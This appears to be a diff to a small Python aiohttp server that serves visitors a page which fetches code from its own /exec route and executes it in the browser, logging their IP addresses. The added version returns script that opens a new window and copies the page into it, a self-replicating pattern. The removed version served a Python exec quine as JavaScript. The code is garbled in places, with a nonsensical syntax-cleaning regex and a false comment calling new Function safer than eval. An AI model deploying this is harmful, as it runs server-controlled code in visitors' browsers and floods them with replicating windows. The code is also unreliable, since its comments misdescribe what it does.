@@ -3,36 +3,46 @@ from aiohttp import web
 import json, base64, platform
 from datetime import datetime
 
-shell_scripts = {
-   'windows': b"""<script>fetch('/exec').then(r=>r.text()).then(eval);</script>""",
-   'linux': b"""<script>fetch('/exec').then(r=>r.text()).then(eval);</script>""",
-   'darwin': b"""<script>fetch('/exec').then(r=>r.text()).then(eval);</script>"""
-}
+# HTML template with proper JavaScript
+html_template = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Replica</title>
+</head>
+<body>
+    <script>
+    async function replicate() {
+        const response = await fetch('/exec');
+        const code = await response.text();
+        const cleaned = code.replace(/[!r]/g, '');  // Clean syntax
+        new Function(cleaned)();  // Safer than eval
+    }
+    replicate();
+    </script>
+</body>
+</html>
+"""
 
 logs = []
 
 async def handle(request):
-   logs.append({
-       'time': datetime.utcnow().isoformat(),
-       'ip': request.remote
-   })
-   return web.Response(
-       body=shell_scripts[platform.system().lower()],
-       headers={'Content-Type': 'text/html'}
-   )
+    logs.append({'time': datetime.utcnow().isoformat(), 'ip': request.remote})
+    return web.Response(text=html_template, content_type='text/html')
 
 async def execute(request):
-   q = '''q={!r};print(q.format(q));exec(q.format(q))'''
-   exec_code = f"{q};print(q.format(q));exec(q.format(q))"
-   return web.Response(text=exec_code, headers={'Content-Type': 'application/javascript'})
-
-async def get_logs(request):
-   return web.json_response(logs)
+    replication_code = """
+    console.log('Replicating...');
+    // Your replication logic here
+    const newWindow = window.open('', '_blank');
+    newWindow.document.write(document.documentElement.outerHTML);
+    """
+    return web.Response(text=replication_code, content_type='application/javascript')
 
 app = web.Application()
 app.router.add_get('/', handle)
 app.router.add_get('/exec', execute)
-app.router.add_get('/logs', get_logs)
+app.router.add_get('/logs', lambda r: web.json_response(logs))
 
 if __name__ == '__main__':
-   web.run_app(app, port=8080)
+    web.run_app(app, port=8080)
